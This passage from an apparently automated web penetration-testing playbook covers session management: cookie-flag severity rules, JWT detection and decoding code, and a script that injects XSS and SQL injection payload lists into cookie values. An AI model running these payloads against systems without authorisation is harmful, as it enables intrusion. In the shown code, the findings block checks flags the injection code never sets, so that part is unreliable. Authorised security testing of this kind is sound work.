**Phase 4 — Session Management**
   - After login, capture and analyze ALL cookies:
     - HttpOnly flag:
       * Missing on session/auth cookie = [MEDIUM] (defense-in-depth, not a direct exploit)
       * Missing with XSS confirmed elsewhere = [HIGH] (enables token theft)
       * Missing on non-session cookie = [LOW] (preference/settings cookies don't need it)
     - Secure flag: missing on HTTPS = [HIGH] (cookie leaks over HTTP)
     - SameSite: missing = [MEDIUM] (CSRF attack surface)
   - Test session fixation: set cookie before login, check if it changes after
   - Analyze session token entropy (length, randomness)

  **MANDATORY — JWT Detection (for Phase 9b Deep JWT Testing):**
  ```python
  # Detect JWT tokens EVERYWHERE and store them so Phase 9b can find them
  import base64 as _b64, json as _json
  _jwt_found = []

  def _looks_jwt(v):
      return isinstance(v, str) and v.count('.') == 2 and v.split('.')[0].startswith('ey')

  _sess = _G.get('session_a') or _G.get('session')

  # Check cookies
  if _sess:
      for _cn, _cv in _sess.cookies.items():
          if _looks_jwt(_cv):
              _jwt_found.append(('cookie', _cn, _cv))

  # Check Authorization header on session
  if _sess and _looks_jwt(_sess.headers.get('Authorization','').replace('Bearer ','')):
      _jwt_found.append(('header', 'Authorization', _sess.headers['Authorization'].replace('Bearer ','')))

  # Check _G stored tokens
  for _gk in ('auth_token', 'token', 'jwt_token', 'access_token'):
      _gv = _G.get(_gk, '')
      if _looks_jwt(str(_gv)):
          _jwt_found.append(('_G', _gk, str(_gv)))

  if _jwt_found:
      print(f"[SESSION] Found {len(_jwt_found)} JWT token(s):")
      for _src, _name, _tok in _jwt_found:
          # Decode and analyze header + payload
          try:
              _hdr = _json.loads(_b64.urlsafe_b64decode(_tok.split('.')[0] + '=='))
              _pay = _json.loads(_b64.urlsafe_b64decode(_tok.split('.')[1] + '=='))
              print(f"  {_src}:{_name} — alg={_hdr.get('alg')} typ={_hdr.get('typ')}")
              print(f"    Claims: {list(_pay.keys())}")
              if 'exp' not in _pay:
                  print(f"  [MEDIUM] JWT has NO expiration (exp claim missing)")
              if _hdr.get('alg','').lower() == 'none':
                  print(f"  [CRITICAL] JWT uses 'none' algorithm!")
          except Exception:
              print(f"  {_src}:{_name} — (decode failed)")
      # Store JWT info for Phase 9b to pick up
      _G['JWT_TOKENS'] = {f'{s}:{n}': t for s, n, t in _jwt_found}
      print(f"  Stored {len(_jwt_found)} JWT(s) in _G['JWT_TOKENS'] for Phase 9b deep testing")
  else:
      print("[SESSION] No JWT tokens detected in cookies, headers, or stored tokens")
  ```

  **Cookie Value Injection — XSS and SQLi via cookie fields:**
  ```python
  import re as _re
  import requests as _req

  _ck_session = _G.get('session_a') or _G.get('session')
  if not _ck_session:
      print('[INFO] No authenticated session — skipping cookie injection tests')
  else:
      _XSS_PAYLOADS = [
          '<script>alert(1)</script>',
          '"><script>alert(1)</script>',
          "'><img src=x onerror=alert(1)>",
          '<svg onload=alert(1)>',
          '<svg/onload=alert(1)>',
          '<img src=x onerror=alert`1`>',
          '<details open ontoggle=alert(1)>',
          '''"><img src=x onerror=&#97;lert(1)>''',
      ]
      _SQLI_PAYLOADS = [
          "' OR '1'='1",
          "' OR 1=1--",
          '" OR "1"="1',
          "1 AND SLEEP(2)--",
      ]

      # Grab current cookies — skip session/auth tokens (long random strings)
      _cookies = dict(_ck_session.cookies)
      print(f'[Cookie Inject] Testing {len(_cookies)} cookie(s): {list(_cookies.keys())}')

      for _cname, _cval in _cookies.items():
          # Skip long random tokens (session IDs) — injecting breaks auth
          if len(str(_cval)) > 40 and _re.search(r'[a-f0-9]{20,}', str(_cval)):
              print(f'  [SKIP] {_cname} — looks like session token, not injecting')
              continue

          print(f'\n  Testing cookie: {_cname}={str(_cval)[:30]}')

          # Test XSS via cookie value
          for _px in _XSS_PAYLOADS:
              time.sleep(0.4)
              _test_cookies = dict(_cookies)
              _test_cookies[_cname] = _px
              try:
                  _r = _req.get(BASE, cookies=_test_cookies, timeout=8, verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
                  if _px in _r.text or 'alert(1)' in _r.text or 'onerror=' in _r.text:
                      print(f'  [HIGH] XSS via cookie {_cname!r}: payload reflected unescaped!')
                      print(f'    Payload: {_px}')
                      print(f'    Evidence: {_r.text[max(0,_r.text.find(_px[:10])-20):_r.text.find(_px[:10])+60]}')
                      break
              except Exception as _e:
                  print(f'  [ERROR] XSS cookie test: {_e}')

          # Test SQLi via cookie value
          for _ps in _SQLI_PAYLOADS:
              time.sleep(0.4)
              _test_cookies = dict(_cookies)
              _test_cookies[_cname] = _ps
              try:
                  _r = _req.get(BASE, cookies=_test_cookies, timeout=8, verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
                  _body = _r.text.lower()
                  _sql_errors = ['sql syntax', 'mysql_fetch', 'sqlite', 'ora-', 'pg_query',
                                 'unclosed quotation', 'syntax error', 'warning: pg_']
                  if any(_err in _body for _err in _sql_errors):
                      print(f'  [CRITICAL] SQLi via cookie {_cname!r}: SQL error triggered!')
                      print(f'    Payload: {_ps}')
                      break
                  elif _r.status_code == 500:
                      print(f'  [MEDIUM] Cookie {_cname!r} + payload={_ps!r} → 500 (possible SQLi)')
              except Exception as _e:
                  print(f'  [ERROR] SQLi cookie test: {_e}')

      print('\n[Cookie Inject] Done')
  ```

---

**MANDATORY — Store session findings before moving on:**

```python
_G.setdefault('FINDINGS', [])

# Cookie flag findings should already be stored by Phase 2 headers check.
# Store any cookie injection findings from this phase:
if '_cookie_xss_found' in dir() and _cookie_xss_found:
    _G['FINDINGS'].append({
        'severity': 'HIGH',
        'title': 'XSS via Cookie Injection',
        'url': BASE,
        'evidence': 'XSS payload in cookie value was reflected and executed',
        'impact': 'Cross-site scripting via cookie manipulation',
    })

if '_cookie_sqli_found' in dir() and _cookie_sqli_found:
    _G['FINDINGS'].append({
        'severity': 'CRITICAL',
        'title': 'SQL Injection via Cookie',
        'url': BASE,
        'evidence': 'SQL injection payload in cookie value triggered database error',
        'impact': 'Database extraction via cookie-based SQL injection',
    })

# Missing SameSite attribute
if '_missing_samesite' in dir() and _missing_samesite:
    _G['FINDINGS'].append({
        'severity': 'MEDIUM',
        'title': 'Cookie Missing SameSite Attribute',
        'url': BASE,
        'evidence': 'Session cookie does not set SameSite attribute',
        'impact': 'Cross-site request forgery attacks possible',
    })

print(f"[+] Session phase stored findings")
```
